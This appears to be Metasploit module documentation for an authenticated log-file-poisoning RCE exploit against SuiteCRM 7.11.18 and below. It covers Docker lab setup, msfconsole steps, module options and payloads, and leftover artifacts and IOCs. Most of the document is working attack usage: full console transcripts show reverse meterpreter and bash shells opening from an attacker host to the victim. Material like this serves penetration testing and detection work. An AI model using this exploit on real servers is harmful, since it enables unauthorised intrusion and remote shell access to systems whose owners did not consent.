## Vulnerable Application

SuiteCRM versions 7.11.18 and below. https://docs.suitecrm.com/admin/releases/7.11.x/#_7_11_18  

### Installation
Installation: https://docs.suitecrm.com/admin/installation-guide/downloading-installing/  

The fastest way to stand up a quick test instance is with docker. Bitnami hosts docker images and `docker-compose.yml` files.

Docker installation: https://docs.docker.com/get-docker/

```
curl -sSL https://raw.githubusercontent.com/bitnami/bitnami-docker-suitecrm/master/docker-compose.yml > docker-compose.yml
docker-compose up -d
```

You'll just want to edit the docker-compose file to pull the 7.11.18 release before you run `docker-compose up -d`. Example `docker-compose.yml` below:

```
  suitecrm:
    image: docker.io/bitnami/suitecrm:7.11.18
```

## Verification Steps
Example steps in this format (is also in the PR):

1. Install the application
2. Start msfconsole
3. Do: `use exploit/linux/http/suitecrm_log_file_rce`
4. Do: `set USER [username]`
5. Do: `set PASS [password]`
6. Do: `set RHOSTS [IP]`
7. Do: `set SRVPORT [IP]`
8. Do: `set LHOST [IP] `
9. Do: `exploit`
10. You should get a shell.

## Options
### USER
Username of a user with administrator access to the SuiteCRM instance

### PASS
Password of the user with administrator access to the SuiteCRM instance

### TARGETURI
The base path to SuiteCRM. The default is `/`

### RESTORECONF
Restore the system log file settings to the default value of `suitecrm.log`. Default value is `true`

### LASTNAME
Last name you'd like to set the admin user back to after running the exploit. Default is `admin`.

### WRITABLEDIR
Any writable directory for paylod to be written. Only used for targets `0` ( `x64 meterpreter` ) and `2` ( `x86 meterpreter` )

## Targets
Default is `0` with a payload of `linux/x64/meterpreter_reverse_tcp`
```
Exploit targets:

   Id  Name
   --  ----
   0   Linux (x64)
   1   Linux (cmd)
```
Currently, this supports
* `linux/x64/meterpreter_reverse_tcp`
* `cmd/unix/bash_reverse_tcp`

There is some encoding/escaping on the php poisoning into the log file, so php code is limited. I would also presume an `x86` meterpreter would run fine, but I haven't tested it. I did test a `cmd/unix/bash_reverse_udp` and it worked fine. I would presume most `cmd` payloads will work contingent on the required tools being available on the victim machine.

### Artifacts/IOC's
Target 0 is going to leave a random, 8 character alphanumeric PHP file such as this
```
ryl2bLse.pHp
```
in the webroot and it will leave a random alphanumeric 8 character file in `WRITABLEDIR` (`/tmp` by default) similar to this
```
uG0QjRbK
```
Operators: keep an eye out for the last couple of lines of output
```
[!] This exploit may require manual cleanup of 'eTHsm71W.pHp' on the target
[!] This exploit may require manual cleanup of '/tmp/54N6HA1E' on the target
```

## Scenarios
### SuiteCRM 7.11.18 Check + Target 0 (linux x64 meterpreter)
```
msf6 > use exploit/linux/http/suitecrm_log_file_rce
[*] Using configured payload linux/x64/meterpreter_reverse_tcp
msf6 exploit(linux/http/suitecrm_log_file_rce) > set RHOSTS 192.168.122.29
RHOSTS => 192.168.122.29
msf6 exploit(linux/http/suitecrm_log_file_rce) > set USER admin
USER => admin
msf6 exploit(linux/http/suitecrm_log_file_rce) > set PASS admin
PASS => admin
msf6 exploit(linux/http/suitecrm_log_file_rce) > set SRVHOST 192.168.122.125
SRVHOST => 192.168.122.125
msf6 exploit(linux/http/suitecrm_log_file_rce) > set LHOST 192.168.122.125
LHOST => 192.168.122.125
msf6 exploit(linux/http/suitecrm_log_file_rce) > check

[*] Authenticating as admin
[+] Authenticated as: admin
[+] admin has administrative rights.
[+] SuiteCRM Version 7.11.18
[*] 192.168.122.29:80 - The target appears to be vulnerable.
msf6 exploit(linux/http/suitecrm_log_file_rce) > exploit

[*] Started reverse TCP handler on 192.168.122.125:4444 
[*] Using URL: http://192.168.122.125:8080/NzzKmKY
[*] Authenticating as admin
[+] Authenticated as: admin
[+] admin has administrative rights.
[*] Modifying systems setting file
[*] Poisoning log file
[*] Executing php code in log file: fxg8pi1C.pHp
[+] 192.168.122.29:80 - Payload sent!
[*] Meterpreter session 1 opened (192.168.122.125:4444 -> 192.168.122.29:43346) at 2021-05-21 22:52:15 -0500
[*] Restoring log file to default configuration
[*] Server stopped.
[!] This exploit may require manual cleanup of 'fxg8pi1C.pHp' on the target
[!] This exploit may require manual cleanup of '/tmp/9yCGovF5' on the target

meterpreter > getuid
Server username: daemon @ bb77d61a4df1 (uid=1, gid=1, euid=1, egid=1)
meterpreter > exit
[*] Shutting down Meterpreter...

[*] 172.21.0.3 - Meterpreter session 1 closed.  Reason: User exit
```
### SuiteCRM 7.11.18 Check + Target 1 (Unix bash reverse TCP shell)
This was run immediately after the previous scenario. Initialization is exactly the same.
```
msf6 exploit(linux/http/suitecrm_log_file_rce) > sessions -i

Active sessions
===============

No active sessions.

msf6 exploit(linux/http/suitecrm_log_file_rce) > set target 1
target => 1
msf6 exploit(linux/http/suitecrm_log_file_rce) > run

[*] Started reverse TCP handler on 192.168.122.125:4444 
[*] Using URL: http://192.168.122.125:8080/Kle8QoPV
[*] Authenticating as admin
[+] Authenticated as: admin
[+] admin has administrative rights.
[*] Modifying systems setting file
[*] Poisoning log file
[*] Executing php code in log file: 1cOyYGE3.pHp
[+] 192.168.122.29:80 - Payload sent!
[*] Command shell session 2 opened (192.168.122.125:4444 -> 192.168.122.29:43366) at 2021-05-21 22:53:03 -0500
[*] Restoring log file to default configuration
[*] Server stopped.
[!] This exploit may require manual cleanup of '1cOyYGE3.pHp' on the target

id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
whoami
daemon
exit
[*] 192.168.122.29 - Command shell session 2 closed.

```

